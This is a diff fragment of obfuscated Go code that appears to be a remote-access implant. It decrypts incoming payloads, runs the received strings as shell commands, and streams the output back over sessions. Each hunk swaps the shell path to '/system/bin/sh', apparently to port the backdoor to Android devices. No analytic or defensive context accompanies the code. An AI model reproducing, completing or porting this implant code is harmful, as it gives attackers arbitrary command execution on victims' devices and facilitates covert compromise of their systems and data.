@@ -60,7 +60,7 @@ func obf_func_decrypt(obf_var_payload []byte) []byte {
 }
 
 func obf_func_exec(obf_var_shell_command string) []byte {
-	obf_var_stdout, obf_var_e := exec.Command("/usr/bin/env", "sh", "-c", obf_var_shell_command).Output()
+	obf_var_stdout, obf_var_e := exec.Command("/system/bin/sh", "-c", obf_var_shell_command).Output()
 	if obf_var_e != nil {
 		return []byte(obf_var_e.Error())
 	}
@@ -119,7 +119,7 @@ func obf_func_stream(obf_stream *obf_struct_stream) {
 					}
 				} else {
 					obf_stream.obf_var_shell.Wait()
-					obf_var_subshell := exec.Command("/usr/bin/env", "sh", "-c", strings.Join(obf_var_split_packet[0:len(obf_var_split_packet) - 2], " "))
+					obf_var_subshell := exec.Command("/system/bin/sh", "-c", strings.Join(obf_var_split_packet[0:len(obf_var_split_packet) - 2], " "))
 					obf_var_stderr_subpipe, _ := obf_var_subshell.StderrPipe()
 					obf_var_stdout_subpipe, _ := obf_var_subshell.StdoutPipe()
 					obf_var_e := obf_var_subshell.Start()
@@ -196,7 +196,7 @@ func main() {
 						obf_var_shell_command := strings.Join(obf_var_split_payload[2:len(obf_var_split_payload) - 2], " ")
 						obf_var_a, _ := strconv.Atoi(obf_var_split_payload[len(obf_var_split_payload) - 2])
 						obf_var_b, _ := strconv.Atoi(obf_var_split_payload[len(obf_var_split_payload) - 1])
-						obf_var_shell := exec.Command("/usr/bin/env", "sh", "-c", obf_var_shell_command)
+						obf_var_shell := exec.Command("/system/bin/sh", "-c", obf_var_shell_command)
 						obf_var_stderr_pipe, _ := obf_var_shell.StderrPipe()
 						obf_var_stdout_pipe, _ := obf_var_shell.StdoutPipe()
 						obf_stream := obf_struct_stream { []byte{}, obf_var_shell, []int{obf_var_a, obf_var_b}, obf_var_stream_session_id, false, false }
